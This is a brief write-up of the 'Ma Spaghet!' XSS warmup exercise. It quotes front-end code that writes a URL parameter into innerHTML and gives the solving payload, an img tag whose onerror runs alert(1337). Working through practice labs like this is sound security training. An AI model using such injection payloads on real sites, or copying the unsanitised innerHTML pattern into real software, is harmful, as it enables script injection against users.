# Ma Spaghet! - Exercise 1

[Problem](https://xss.pwnfunction.com/warmups/ma-spaghet/)

[Solution](https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=%3Cimg%20src=%22hello.jpg%22%20onerror=%22alert(1337)%22%3E)

## Explanation

Here is the part of the Front End code to inject JavaScript

```html
<h2 id="spaghet"></h2>
<script>
    spaghet.innerHTML = (new URL(location).searchParams.get('somebody') || "Somebody") + " Toucha Ma Spaghet!"
</script>
```

The JS script reads the parameter *somebody* or *Somebody* and change the content of h2 tag with the value of the parameter along with a parameter appended.
To inject the script, set the parameter somebody to `<img src="hello.jpg" onerror="alert(1337)">` . It is an image tag of unknown origin, which throws an error. When thrown an error, it executes the JS script `alert(1337)`.

### This might be useful

[About Params in JS](https://flaviocopes.com/urlsearchparams/)